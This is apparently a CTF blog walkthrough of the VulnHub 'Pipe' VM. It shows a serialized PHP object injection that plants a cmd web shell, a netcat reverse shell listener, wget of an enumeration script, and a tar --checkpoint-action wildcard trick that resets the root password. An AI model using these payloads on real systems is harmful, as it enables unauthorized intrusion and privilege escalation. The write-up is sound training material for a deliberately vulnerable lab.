---
layout: blog_item
title:  "/dev/random Pipe walkthrough"
date:   2015-11-26 01:05:10
author: Arr0way
description: 'Walkthrough for /dev/random: Pipe a VulnHub CTF boot2root.'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Description

Another short, but fun VM. 

**Author:** [@s4gi_ ](https://twitter.com/s4gi_ )

**Download:** [/dev/random: Pipe](http://www.vulnhub.com/entry/devrandom-pipe,124/) via [@VulnHub](https://twitter.com/VulnHub)


{% highlight bash %}

_______.__               
\______   \__|_____   ____  
 |     ___/  \____ \_/ __ \
  |    |   |  |  |_> >  ___/
   |____|   |__|   __/ \___  >
                |__|        \/  ·VM· (MiNi CHaLLeNGe BuiLT FoR ZaCoN Vi)

{% endhighlight %}

## Enumeration

{% highlight bash %}

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f (DSA)
|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 (RSA)
|_  256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 (ECDSA)
80/tcp    open  http    syn-ack Apache httpd
| http-auth:
| HTTP/1.1 401 Unauthorized
|_  Basic realm=index.php
|_http-server-header: Apache
|_http-title: 401 Unauthorized
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          42192/udp  status
|_  100024  1          47286/tcp  status
47286/tcp open  status  syn-ack 1 (RPC #100024)
MAC Address: 00:0C:29:05:96:3D (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Uptime guess: 199.640 days (since Sat May  9 04:40:31 2015)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

{% endhighlight %}

### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 6.7p1 Debian 5</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache HTTPD</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 111</code></p></pc>
           </td>
           <td>
              <pc><p>rcpbind</p></pc>
           </td>
           <td>
               <pc><p>n/a</p></pc>
           </td>
        </tr>
      </tbody>

</table>
</div>

### HTTP Enumeration

Running OWASP dirbuster against port 80 exposed <code>/scriptz/</code>
containing javascript and php files.

![OWASP DirBuster](/img/blog/pipe/dirbuster.png)

## Source Code Interrogation

### php.js Interrogation

<code>js.php</code> source revealed **function
serialize**

**note:** *the examples at the bottom.*

{% highlight bash %}
function serialize(mixed_value) {
//  discuss at: http://phpjs.org/functions/serialize/
// original by: Arpad Ray (mailto:arpad@php.net)
// improved by: Dino
// improved by: Le Torbi (http://www.letorbi.de/)
// improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)
// bugfixed by: Andrej Pavlovic
// bugfixed by: Garagoth
// bugfixed by: Russell Walker (http://www.nbill.co.uk/)
// bugfixed by: Jamie Beck (http://www.terabit.ca/)
// bugfixed by: Kevin van Zonneveld
//  (http://kevin.vanzonneveld.net/)
// bugfixed by: Ben (http://benblume.co.uk/)
//    input by: DtTvB  (http://dt.in.th/2008-09-16.string-length-in-bytes.h
//    input by: Martin (http://www.erlenwiese.de/)
//        note: We feel the main purpose of this function should be to ease the transport of data between php & js
//        note: Aiming for PHP-compatibility, we have to translate objects to arrays
//   example 1: serialize(['Kevin', 'van', 'Zonneveld']);
//   returns 1:'a:3:{i:0;s:5:"Kevin";i:1;s:3:"van";i:2;s:9:"Zonneveld";}'
//   example 2: serialize({firstName:'Kevin', midName: 'van', surName:'Zonneveld'});
//   returns 2: 'a:3:{s:9:"firstName";s:5:"Kevin";s:7:"midName";s:3:"van";s:7:"surName";s:9:"Zonneveld";}'

{% endhighlight %}

### log.php.BAK Interrogation

Inspection of the source revealed it works with the js file for serialization.

![log.php.BAK Source Code Review](/img/blog/pipe/log.php.BAK.png)

## Burp Suite - POST Request

Modifying the request from GET to POST, renendered the index.php

![Burp POST instead of GET](/img/blog/pipe/burp-post.png)

Burp confirmed the Serialized object:

![Burp Serialized Object](/img/blog/pipe/burp-serialized-object.png)

## Burp decode string

![Burp Decode String](/img/blog/pipe/burp-decode-string.png)

Right click the string, send to Decoder.

![Burp Decoder Smart Decoder](/img/blog/pipe/burp-decoder-smart-decode.png)

Click "Smart decode"


Using the example section of the previously discovered php.js file, it was
possible to workout the serialization mechanism.


New modified string introduced with burp:

{% highlight js %}
O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/Meh1.txt";s:4:"data";s:12:"HighOnCoffee"
;}
{% endhighlight %}


Using Burp Decoder URL Encode the above string and using Burp Repeater to
inject.

![Burp Repeater](/img/blog/pipe/burp-repeater.png)

Refreshing the scriptz directory confirmed the creation of Meh.txt containing
the text <code>HighOnCoffee</code>.

## Injecting Reverse Shell Code

Burp Decoder was leveraged to encode the following string:

{% highlight js %}
O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:"
<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>";}
{% endhighlight %}

Select Encode as URL.

Paste encoded string into Burp Repeater:

![Burp Repeater PHP Shell Upload](/img/blog/pipe/burp-repeater-shell.png)

## PHP Shell

![PHP Shell RCE](/img/blog/pipe/php-shell-rce.png)'

## Reverse Shell

nc is installed on the target, the php shell introduced at the previous step is leveraged to execute a netcat reverse shell.

![Execute Netcat](/img/blog/pipe/rev-shell-exec.png)

{% highlight js %}
[root:~]# nc -v -n -l -p 443
listening on [any] 443 ...
connect to [192.168.30.134] from (UNKNOWN) [192.168.30.142] 37957
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
{% endhighlight %}

## Linux Local Privilege Escalation

Spawn tty:

{% highlight bash %}
python -c 'import pty;pty.spawn("/bin/bash")'
{% endhighlight %}

Get HighOn.Coffee linux local enumeration script:

<code>wget https://highon.coffee/downloads/linux-local-enum.sh</code>

![HighOn.Coffee script enum](/img/blog/pipe/enum-rene-home.png)

Inspection of <code>/etc/crontab</code> exposed the script
<code>/usr/bin/compress.sh</code> which is world readable.  

![crontab](/img/blog/pipe/crontab.png)


## Tar  Unix Wildcards Local Privilege Escalation

### Unix Wildcards
The previously discovered backup script uses * to perform a backup of all files
within the directory <code>/home/rene/backup/</code>. Due to poorly configured file system
permission on the backup directory, it's possible to introduce files in the
backup directory which tar will process when it backs up the files in the directory.

### Tar Arbitrary Command Execution

Tar's <code>--checkpoint-action</code> parameter can be abused to
execute arbitrary code as the user executing the tar binary.
<code>--checkpoint-action</code> exists as a tar feature allowing binary
execution of a command when the file prefixed with
<code>--checkpoint-action=exec=COMMAND-HERE</code> is reached.

{% highlight bash %}
www-data@pipe:/home/rene/backup$ echo > --checkpoint-action=exec=sh\ passwd.sh;
<ckup$ echo > --checkpoint-action=exec=sh\ passwd.sh;                        
www-data@pipe:/home/rene/backup$ echo > --checkpoint=1;
echo > --checkpoint=1;
{% endhighlight %}

The above leverages the tar arbitrary command execution, reseting the root
account password when the cronjob is processed (every 5 minutes).

## Root Flag

After 5 minutes, escalate root privileges by executing <code>su -</code>
and entering the password <code>passwd</code>.

![Pipe Root Flag VulnHub](/img/blog/pipe/pipe-root-flag.png)

Thanks for the VM :)
